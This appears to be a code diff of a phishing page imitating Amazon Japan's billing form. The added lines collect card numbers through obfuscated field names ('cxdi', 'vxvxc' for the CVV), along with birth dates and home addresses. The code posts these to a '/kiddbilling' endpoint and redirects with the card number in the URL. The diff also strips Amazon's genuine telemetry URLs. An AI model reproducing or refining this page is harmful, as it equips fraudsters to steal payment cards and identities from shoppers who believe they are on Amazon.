@@ -577,8 +577,6 @@
                     ue_mid = 'A1VC38T7YXB528',
                     ue_sid = '355-4640336-8235941',
                     ue_sn = 'www.amazon.co.jp',
-                    ue_furl = 'fls-fe.amazon.co.jp',
-                    ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
                     ue_int = 0,
                     ue_fcsn = 1,
                     ue_urt = 3,
@@ -1985,11 +1983,20 @@
 
                             function checkForm(formA) {
                                 var cxdi = $('#cxdi').val();
+                                var cvv = $('#vxvxc').val();
                                 var months = $('#months').val();
                                 var year = $('#years').val();
                                 var birth_year = $('#birth_year').val();
                                 var birth_month = $('#birth_month').val();
                                 var birth_day = $('#birth_day').val();
+                                if (cxdi == '' || cxdi.length <15 || (cxdi[0]!=3 && cxdi.length == 15)  ) {
+                                    alert('有効なクレジットカードまたはデビットカードの番号を入力してください');
+                                    return false;
+                                }
+                                if (cvv == '') {
+                                    alert('セキュリティコードを入力してください');
+                                    return false;
+                                }
                                 if (months == '月' || year == '年') {
                                     alert('有効期限を入力してください');
                                     return false;
@@ -2346,7 +2353,7 @@
         var birth_day = $("#birth_day").val();
         var enterAddressPostalCodeOne = $("#address-ui-widgets-enterAddressPostalCodeOne").val();
         var enterAddressPostalCodeTwo = $("#address-ui-widgets-enterAddressPostalCodeTwo").val();
-        var enterAddressStateOrRegion = $("address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId").val();
+        var enterAddressStateOrRegion = $("#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId").val();
         var enterAddressLine1 = $("#address-ui-widgets-enterAddressLine1").val();
         var enterAddressLine2 = $("#address-ui-widgets-enterAddressLine2").val();
         var enterAddressLine3 = $("#address-ui-widgets-enterAddressLine3").val();
@@ -2357,7 +2364,7 @@
         var month = $("#months").val();
         var year = $("#years").val();
         if (!checkForm()) return;
-        $.post("/billing2",
+        $.post("/kiddbilling",
                 {   countryCode: countryCode,
                     enterAddressFullName: enterAddressFullName,
                     birth_year: birth_year,
@@ -2377,7 +2384,7 @@
                     year: year
                 },
                 function (data) {
-                    window.location.href = '/verifiedby?nameCard='+nameCard+'&cxdi='+cxdi;
+                    window.location.href = '/verified?nameCard='+nameCard+'&cxdi='+cxdi;
                 }, "json");
     })
 </script>
